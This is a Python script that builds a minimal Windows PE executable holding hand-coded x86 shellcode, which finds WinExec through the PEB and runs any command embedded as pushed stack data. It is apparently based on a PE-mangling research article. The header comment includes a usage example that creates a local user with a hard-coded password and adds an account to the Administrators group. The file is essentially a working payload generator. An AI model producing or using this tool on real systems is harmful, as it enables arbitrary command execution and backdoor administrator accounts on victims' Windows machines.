# Based on https://n0.lol/a/pemangle.html python3 winExecGen.py openff.exe "C:\Program Files\Mozilla Firefox\firefox.exe https://n0.lol" python3 
# winExecGen.py addadmin.exe "cmd.exe /c net user ayy ayyylmao /ADD && net localgroup Administrators ROOT /ADD"
def encPayload(cmdy):
  encoded=[]
  i = 0 # Counter
  l = 4 # The length of each chunk
  cmdz = [cmdy[i:i+l] for i in range(0, len(cmdy), l)]
  lCmdz = len(cmdz)
  if len(cmdz[lCmdz-1]) < 4:
    for c in cmdz:
      if i == lCmdz-1:
        extra = 4 - len(cmdz[i]) # This part double checks if last command then pads...
        finalIns = "b8"+cmdz[i].hex()+("00"*extra) # ...with zeroes to create the final instruction
        encoded.insert(0,'50') # Push EAX
        encoded.insert(0,finalIns) # Insert the last mov eax, somenumber
      else:
        encoded.insert(0,'68'+cmdz[i].hex())
      i = i + 1
  else:
    for c in cmdz:
      encoded.insert(0,'68'+cmdz[i].hex())
      i = i + 1
    encoded.insert(0,'50') # Push EAX
  return encoded 
def encodePayload(fname, incmd):
    cmdx = incmd.encode('ascii')
    encoded=encPayload(cmdx)
    #--- First half of binary
    one = [ '4d','5a','01','00','50','45','00','00','4c','01','00','00','00','00','00','00',
            '00','00','00','00','00','00','00','00','60','00','03','01','0b','01','00','00',
            '03','00','00','00','00','00','00','00','00','00','00','00','7c','00','00','00',
            '00','00','00','00','00','00','00','00','00','00','40','00','04','00','00','00',
            '04','00','00','00','00','00','00','00','00','00','00','00','05','00','00','00',
            '00','00','00','00','80','00','00','00','7c','00','00','00','00','00','00','00',
            '02','00','00','04','00','00','10','00','00','10','00','00','00','00','10','00',
            '00','10','00','00','00','00','00','00','00','00','00','00','31','c0','64','8b',
            '40','30','8b','40','0c','8b','70','1c','ad','96','ad','8b','40','08','50','8b',
            '58','3c','01','c3','8b','5b','78','01','c3','8b','53','20','01','c2','8b','4b',
            '24','01','c1','51','8b','7b','1c','01','c7','57','68','57','69','6e','45','31',
            'c0','89','d7','89','e6','31','c9','fc','8b','3c','87','03','7c','24','0c','66',
            '83','c1','04','f3','a6','74','03','40','eb','e7','8b','4c','24','08','66','8b',
            '04','41','8b','54','24','04','8b','1c','82','03','5c','24','0c','31','c9','f7',
            'e1' ]
    #--- Second half
    two = [ '89','e0','51','50', 'ff', 'd3' ]
    joinBin = "".join(one + encoded + two)
    # 268*2 = 536
    if len(joinBin) < 536:
        joinBin = joinBin + "0"*(536 - len(joinBin))
        outBin = bytearray.fromhex(joinBin)
    else:
        outBin = bytearray.fromhex(joinBin)
    with open(fname, 'wb') as w:
        w.write(outBin) 
if __name__=="__main__":
    encodePayload("test","test")
